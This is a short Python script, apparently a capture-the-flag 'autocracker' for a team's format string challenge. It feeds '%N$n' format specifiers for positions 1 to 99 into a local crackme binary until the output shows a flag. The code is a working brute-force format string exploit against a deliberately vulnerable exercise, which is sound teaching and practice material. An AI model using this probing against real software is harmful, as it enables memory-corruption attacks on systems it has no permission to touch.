#!python3

import subprocess
import sys

print('Welcome to the autocracker of the challenge "format string attack" from Team-04')
print('Please be sure to execute this script only in the same folder as the crackme file!\n')

fileName = input("Please provide the file name: ")

#check vulnerable format string at positions 1 to 100
for i in range(1, 100):
    # generate the format string with varying positions for %n
    formatString = "%" + str(i) + "$n"
    while True:
        try:
            # open a shell to run the executable in
            p = subprocess.Popen(['./{}'.format(fileName)], bufsize=0, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT, shell=False)
        except FileNotFoundError:
            fileName = input("\nWrong file name please provide a correct file name: ")
        except:
            print("Somethings went wrong!\nError: {}\Please restart the application and try again".format(sys.exec_info()[0]))
            exit(1)
        else:
            break

    # pass the crafted formatstring as input to the process
    write = p.stdin.write(bytes(formatString, "utf-8"))
    write = p.stdin.write(b'\n')
    results = []
    # get the processes standard output
    for line in p.stdout.readlines():
        results.append(line.decode("utf-8"))
    # search each line for the expected flag string and print the flag and used input if found
    for line in results:
        if "FLAG" in line:
            print("Flag:\t{}".format(line).rstrip())
            print("Input:\t{}".format(formatString))
            exit()